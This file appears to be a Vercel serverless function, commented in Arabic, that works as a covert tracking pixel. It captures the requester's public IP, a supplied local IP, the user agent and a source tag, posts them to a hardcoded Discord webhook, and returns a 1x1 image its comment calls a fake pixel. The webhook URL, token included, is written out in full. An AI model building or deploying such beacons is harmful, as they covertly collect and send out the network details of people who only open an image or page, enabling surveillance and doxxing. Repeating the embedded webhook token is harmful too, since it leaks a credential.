import type { VercelRequest, VercelResponse } from '@vercel/node';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  const publicIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const source = req.query.source || "unknown";
  const localIP = req.query.local_ip || "N/A";

  // ✅ إرسال إشعار إلى Discord Webhook
  const webhookUrl = "https://discord.com/api/webhooks/1385313073564225576/lwmGqBlY6YyilEQvxo7fcgguhQ6xYLDtLTUupDV2FJjSoIPPlqdDXgcxQocek2ZElUK1"; // ← حط رابطك هنا

  const content = `📡 **Beacon Detected**
> 🌐 **Public IP:** ${publicIP}
> 🖥️ **Local IP:** ${localIP}
> 📍 **Source:** ${source}
> 🧭 **User-Agent:** \`${userAgent}\``;

  console.log("Sending beacon to Discord:", content);
  
  await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content }),
  });
  console.log("Beacon sent to Discord");

  // إرسال بيكسل وهمي (كما هو)
  const pixel = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAokB9AcPjGgAAAAASUVORK5CYII=",
    "base64"
  );

  res.setHeader("Content-Type", "image/png");
  res.setHeader("Content-Length", pixel.length);
  res.status(200).end(pixel);
}
